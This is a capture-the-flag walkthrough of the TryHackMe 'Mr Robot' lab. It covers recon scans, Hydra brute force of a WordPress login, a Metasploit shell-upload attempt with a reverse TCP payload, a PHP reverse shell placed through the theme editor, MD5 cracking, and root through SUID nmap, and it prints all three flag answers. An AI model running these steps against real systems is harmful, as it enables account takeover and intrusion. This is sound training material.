# Mr Robot  - Try Hack Me

Reference: [MR Robot CTF](https://tryhackme.com/room/mrrobot)

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nmap -A 10.10.158.151
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-30 21:10 CET
Nmap scan report for 10.10.158.151
Host is up (0.030s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.95 seconds
```

We know there a webserver living here, lets see with nikto and dirb if there is some unindexed pages.

There's TONS of things living here, they are not all interesting but here the report made by dirb and nikto:

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nikto -url 10.10.158.151
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.158.151
+ Target Hostname:    10.10.158.151
+ Target Port:        80
+ Start Time:         2023-12-30 21:22:51 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /6cM4zgNd.xsql: Retrieved x-powered-by header: PHP/5.5.29.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html, index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /admin/: This might be interesting.
+ /readme: This might be interesting.
+ /image/: Drupal Link header found with value: <http://10.10.158.151/?p=23>; rel=shortlink. See: https://www.drupal.org/
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ /wp-login/: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found.
+ /wordpress/wp-admin/wp-login.php: Wordpress login found.
+ /blog/wp-login.php: Wordpress login found.
+ /wp-login.php: Wordpress login found.
+ /wordpress/wp-login.php: Wordpress login found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8074 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2023-12-30 21:31:48 (GMT1) (537 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ dirb http://10.10.158.151               

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec 30 21:23:59 2023
URL_BASE: http://10.10.158.151/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612  

---- Scanning URL: http://10.10.158.151/ ----
==> DIRECTORY: http://10.10.158.151/0/                                                                               
==> DIRECTORY: http://10.10.158.151/admin/                                                                           
+ http://10.10.158.151/atom (CODE:301|SIZE:0)                                                                        
==> DIRECTORY: http://10.10.158.151/audio/                                                                           
==> DIRECTORY: http://10.10.158.151/blog/                                                                            
==> DIRECTORY: http://10.10.158.151/css/                                                                             
+ http://10.10.158.151/dashboard (CODE:302|SIZE:0)                                                                   
+ http://10.10.158.151/favicon.ico (CODE:200|SIZE:0)                                                                 
==> DIRECTORY: http://10.10.158.151/feed/                                                                            
==> DIRECTORY: http://10.10.158.151/image/                                                                           
==> DIRECTORY: http://10.10.158.151/Image/                                                                           
==> DIRECTORY: http://10.10.158.151/images/                                                                          
+ http://10.10.158.151/index.html (CODE:200|SIZE:1188)                                                               
+ http://10.10.158.151/index.php (CODE:301|SIZE:0)                                                                   
+ http://10.10.158.151/intro (CODE:200|SIZE:516314)                                                                  
==> DIRECTORY: http://10.10.158.151/js/                                                                              
+ http://10.10.158.151/license (CODE:200|SIZE:309)                                                                   
+ http://10.10.158.151/login (CODE:302|SIZE:0)                                                                       
+ http://10.10.158.151/page1 (CODE:301|SIZE:0)                                                                       
+ http://10.10.158.151/phpmyadmin (CODE:403|SIZE:94)                                                                 
+ http://10.10.158.151/rdf (CODE:301|SIZE:0)                                                                         
+ http://10.10.158.151/readme (CODE:200|SIZE:64)                                                                     
+ http://10.10.158.151/robots (CODE:200|SIZE:41)                                                                     
+ http://10.10.158.151/robots.txt (CODE:200|SIZE:41)                                                                 
+ http://10.10.158.151/rss (CODE:301|SIZE:0)                                                                         
+ http://10.10.158.151/rss2 (CODE:301|SIZE:0)                                                                        
+ http://10.10.158.151/sitemap (CODE:200|SIZE:0)                                                                     
+ http://10.10.158.151/sitemap.xml (CODE:200|SIZE:0)                                                                 
==> DIRECTORY: http://10.10.158.151/video/                                                                           
==> DIRECTORY: http://10.10.158.151/wp-admin/                                                                        
+ http://10.10.158.151/wp-config (CODE:200|SIZE:0)                                                                   
==> DIRECTORY: http://10.10.158.151/wp-content/                                                                      
+ http://10.10.158.151/wp-cron (CODE:200|SIZE:0)                                                                     
==> DIRECTORY: http://10.10.158.151/wp-includes/                                                                     
+ http://10.10.158.151/wp-links-opml (CODE:200|SIZE:227)                                                             
+ http://10.10.158.151/wp-load (CODE:200|SIZE:0)                                                                     
+ http://10.10.158.151/wp-login (CODE:200|SIZE:2671)                                                                 
+ http://10.10.158.151/wp-mail (CODE:500|SIZE:3064)                                                                  
+ http://10.10.158.151/wp-settings (CODE:500|SIZE:0)                                                                 
+ http://10.10.158.151/wp-signup (CODE:302|SIZE:0)                                                                   
+ http://10.10.158.151/xmlrpc (CODE:405|SIZE:42)                                                                     
+ http://10.10.158.151/xmlrpc.php (CODE:405|SIZE:42)   
```

LEts sum up everything, this site is power by a WordPress instance, living at http://10.10.158.151/wp-login.php. There also a very interesting file at http://10.10.158.151/robots.txt : 

```
User-agent: *
fsocity.dic
key-1-of-3.txt

```

Indeed this file contains the first flag ! Just go to the url http://10.10.158.151/key-1-of-3.txt and you'll find the flag: 073403c8a58a1f80d943455fb30724b9

The next step will be to force the WordPress instance. Lets go to the login page and use BurpSuite to intercept the traffic:

For input "test"/"test":

```
POST /wp-login.php HTTP/1.1

Host: 10.10.158.151

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 100

Origin: http://10.10.158.151

Connection: close

Referer: http://10.10.158.151/wp-login.php

Cookie: s_cc=true; s_fid=056C3E36DC74A884-2B92F51EBA56E9C4; s_nr=1703968491154; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check

Upgrade-Insecure-Requests: 1



log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1
```

Bingo, knowing the topology of the request will help us brute force it. Hydra is the go to tool when we know the shape of the request. But we need a dictionary for this brute force, in the robots.txt file there's a reference to a file named fsocity.dic. Lets wget it and use it for hydra.

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ wget http://10.10.158.151/fsocity.dic
--2023-12-30 21:49:21--  http://10.10.158.151/fsocity.dic
Connecting to 10.10.158.151:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7245381 (6.9M) [text/x-c]
Saving to: ‘fsocity.dic’

fsocity.dic                   100%[===============================================>]   6.91M  2.78MB/s    in 2.5s    

2023-12-30 21:49:24 (2.78 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]

```
Now using hydra and by reshaping the request we obtain the command: 

```bash
hydra -L fsocity.dic -P fsocity.dic 10.10.158.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:Invalid username"
```

Natural brute force is taking way to much time, let's try to think. We we enter an incorrect username it says "Invalid username". Does it mean that for a correct username but wrong password its different ? 

Let's try to do the same thing but with a different dictionary for passwords, an empty one. 

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ touch empty

┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ nano empty    
```

If the message sent by the login page is different from "Invalid username" it means that we've found the login.

```bash
hydra -L fsocity.dic -P empty 10.10.158.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:Invalid username"
```

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~]
└─$ hydra -L fsocity.dic -P empty 10.10.158.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:Invalid username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-30 22:05:43
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.158.151:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:Invalid username
[80][http-post-form] host: 10.10.158.151   login: Elliot   password: empty
```

The login is Elliot. Lets enter a dummy password to test the new error message ("Elliot"/"test"), error is now: ERROR: The password you entered for the username Elliot is incorrect. Let's modify the hydra command: 


```bash
hydra -l Elliot -P fsocity.dic  10.10.158.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```

I restared the target device and its IP changed:

```bash
hydra -l Elliot -P fsocity.dic  192.168.1.71 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```

Thois is still taking to much time so let's use our brain and see if there's duplicate in this f******* dictionary. 

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/mrroboot]
└─$ sort fsocity.dic | uniq > unique.txt
                                                                                                                      
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/mrroboot]
└─$ wc -l fsocity.dic                   
858160 fsocity.dic
                                                                                                                      
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/mrroboot]
└─$ wc -l unique.txt 
11451 unique.txt
```

```bash
hydra -l Elliot -P unique.txt  192.168.1.71 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```

```
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/mrroboot]
└─$ hydra -l Elliot -P unique.txt  192.168.1.71 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-31 16:41:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.1.71:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.158.151%2Fwp-admin%2F&testcookie=1:The password you entered for the username
[STATUS] 1919.00 tries/min, 1919 tries in 00:01h, 9533 to do in 00:05h, 16 active
[80][http-post-form] host: 192.168.1.71   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-31 16:43:20
```

Finally !!!! 

```
login: Elliot
password: ER28-0652
```

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.71
RHOSTS => 192.168.1.71
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wp-admin/index.php
TARGETURI => /wp-admin/index.php
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD ER28-0652
PASSWORD => ER28-0652
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME Elliot
USERNAME => Elliot
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   PASSWORD   ER28-0652            yes       The WordPress password to authenticate with
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.71         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasplo
                                             it/basics/using-metasploit.html
   RPORT      80                   yes       The target port (TCP)
   SSL        false                no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wp-admin/index.php  yes       The base path to the wordpress application
   USERNAME   Elliot               yes       The WordPress username to authenticate with
   VHOST                           no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.70     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress



View the full module info with the info, or info -d command.
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.70:4444 
[-] Exploit aborted due to failure: not-found: The target does not appear to be using WordPress
[*] Exploit completed, but no session was created.
```

There's a problem with Metasploit, can't debug it lets find another way of doing this.

Ok I must admin a search for little hint online for this step.

We will be using a php reverse shell, we just have to change the content of one of the files in Appearance > Editor with [this php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) open a netcal listner and then go to the url.

I modified content.php so the activation url is http://192.168.1.71/wp-content/themes/twentyfifteen/content.php

And with this we're inside ! 

```bash
$ whoami
daemon
```

We know tyhe format of the flags so lets search for it.

```bash
$ find ./ -type f -name "key-*"
/home/robot/key-2-of-3.txt
```

Permission denied when trying to read it. But we have something else here. 

```bash
$ cd home/robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

When we put this hash into john we obtain:

```bash
┌──(kali㉿2a02-8440-6441-a02f-0a00-27ff-fe62-0f00)-[~/Documents/hacks/mrroboot]
└─$ john --wordlist=unique.txt  --format=Raw-MD5 password.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)     
1g 0:00:00:00 DONE (2023-12-31 17:38) 16.66g/s 54400p/s 54400c/s 54400C/s 808..ARTICLE
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

```bash
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cd home/robot/
cd home/robot/
bash: cd: home/robot/: No such file or directory
robot@linux:~$ ls
ls
key-2-of-3.txt	password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

Let's search for files with root permissions.

```bash
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown

robot@linux:/usr/local/bin$ ls -la 
ls -la 
total 504
drwxr-xr-x  2 root root   4096 Nov 13  2015 .
drwxr-xr-x 10 root root   4096 Jun 24  2015 ..
-rwsr-xr-x  1 root root 504736 Nov 13  2015 nmap

```

By reading the nmap documentation you see that there's a king of nmap shell that wan be launched this way:

```bash
nmap --interactive
nmap> !sh
```

https://gtfobins.github.io/gtfobins/nmap/

```bash
robot@linux:/usr/local/bin$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> sh
sh
Unknown command (sh) -- press h <enter> for help
nmap> h
h
Nmap Interactive Commands:
n <nmap args> -- executes an nmap scan using the arguments given and
waits for nmap to finish.  Results are printed to the
screen (of course you can still use file output commands).
! <command>   -- runs shell command given in the foreground
x             -- Exit Nmap
f [--spoof <fakeargs>] [--nmap_path <path>] <nmap args>
-- Executes nmap in the background (results are NOT
printed to the screen).  You should generally specify a
file for results (with -oX, -oG, or -oN).  If you specify
fakeargs with --spoof, Nmap will try to make those
appear in ps listings.  If you wish to execute a special
version of Nmap, specify --nmap_path.
n -h          -- Obtain help with Nmap syntax
h             -- Prints this help screen.
Examples:
n -sS -O -v example.com/24
f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24

nmap> !sh
!sh
```

Then straight forward to the end.

```bash
# cd /root/
cd /root/
# ls -la
ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```